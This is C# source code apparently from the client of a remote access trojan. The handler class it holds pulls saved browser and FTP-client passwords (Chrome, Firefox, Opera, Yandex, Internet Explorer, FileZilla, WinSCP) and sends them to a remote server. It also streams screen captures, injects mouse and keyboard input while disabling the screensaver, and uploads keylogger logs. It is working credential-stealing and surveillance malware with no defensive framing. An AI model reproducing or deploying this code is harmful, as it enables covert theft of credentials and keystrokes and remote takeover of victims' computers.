using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using xClient.Core.Helper;
using System.Drawing.Imaging;
using System.Threading;
using xClient.Core.Networking;
using xClient.Core.Utilities;
using xClient.Enums;
using System.Collections.Generic;
using xClient.Core.Data;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Recovery.FtpClients;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
    public static partial class CommandHandler
    {
        public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
        {
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            recovered.AddRange(Chrome.GetSavedPasswords());
            recovered.AddRange(Opera.GetSavedPasswords());
            recovered.AddRange(Yandex.GetSavedPasswords());
            recovered.AddRange(InternetExplorer.GetSavedPasswords());
            recovered.AddRange(Firefox.GetSavedPasswords());
            recovered.AddRange(FileZilla.GetSavedPasswords());
            recovered.AddRange(WinSCP.GetSavedPasswords());

            List<string> raw = new List<string>();

            foreach (RecoveredAccount value in recovered)
            {
                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
                raw.Add(rawValue);
            }

            new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
        }

        public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
        {
            var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));

            if (StreamCodec == null)
                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);

            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
                || StreamCodec.Resolution != resolution)
            {
                if (StreamCodec != null)
                    StreamCodec.Dispose();

                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
            }

            BitmapData desktopData = null;
            Bitmap desktop = null;
            try
            {
                desktop = ScreenHelper.CaptureScreen(command.Monitor);
                desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                    ImageLockMode.ReadWrite, desktop.PixelFormat);

                using (MemoryStream stream = new MemoryStream())
                {
                    if (StreamCodec == null) throw new Exception("StreamCodec can not be null.");
                    StreamCodec.CodeImage(desktopData.Scan0,
                        new Rectangle(0, 0, desktop.Width, desktop.Height),
                        new Size(desktop.Width, desktop.Height),
                        desktop.PixelFormat, stream);
                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
                }
            }
            catch (Exception)
            {
                if (StreamCodec != null)
                    new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
                        StreamCodec.Resolution).Execute(client);

                StreamCodec = null;
            }
            finally
            {
                if (desktop != null)
                {
                    if (desktopData != null)
                    {
                        try
                        {
                            desktop.UnlockBits(desktopData);
                        }
                        catch
                        {
                        }
                    }
                    desktop.Dispose();
                }
            }
        }

        public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
        {
            try
            {
                Screen[] allScreens = Screen.AllScreens;
                int offsetX = allScreens[command.MonitorIndex].Bounds.X;
                int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
                Point p = new Point(command.X + offsetX, command.Y + offsetY);

                // Disable screensaver if active before input
                switch (command.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                    case MouseAction.MoveCursor:
                        if (NativeMethodsHelper.IsScreensaverActive())
                            NativeMethodsHelper.DisableScreensaver();
                        break;
                }

                switch (command.Action)
                {
                    case MouseAction.LeftDown:
                    case MouseAction.LeftUp:
                        NativeMethodsHelper.DoMouseLeftClick(p, command.IsMouseDown);
                        break;
                    case MouseAction.RightDown:
                    case MouseAction.RightUp:
                        NativeMethodsHelper.DoMouseRightClick(p, command.IsMouseDown);
                        break;
                    case MouseAction.MoveCursor:
                        NativeMethodsHelper.DoMouseMove(p);
                        break;
                    case MouseAction.ScrollDown:
                        NativeMethodsHelper.DoMouseScroll(p, true);
                        break;
                    case MouseAction.ScrollUp:
                        NativeMethodsHelper.DoMouseScroll(p, false);
                        break;
                }
            }
            catch
            {
            }
        }

        public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
        {
            if (NativeMethodsHelper.IsScreensaverActive())
                NativeMethodsHelper.DisableScreensaver();

            NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
        }

        public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
        {
            if (Screen.AllScreens.Length > 0)
            {
                new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
            }
        }

        public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
        {
            new Thread(() =>
            {
                try
                {
                    int index = 1;

                    if (!Directory.Exists(Keylogger.LogDirectory))
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    FileInfo[] iFiles = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();

                    if (iFiles.Length == 0)
                    {
                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
                        return;
                    }

                    foreach (FileInfo file in iFiles)
                    {
                        FileSplit srcFile = new FileSplit(file.FullName);

                        if (srcFile.MaxBlocks < 0)
                            new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);

                        for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                        {
                            byte[] block;
                            if (srcFile.ReadBlock(currentBlock, out block))
                            {
                                new Packets.ClientPackets.GetKeyloggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
                                //Thread.Sleep(200);
                            }
                            else
                                new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
                        }

                        index++;
                    }
                }
                catch (Exception ex)
                {
                    new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
                }
            }).Start();
        }
    }
}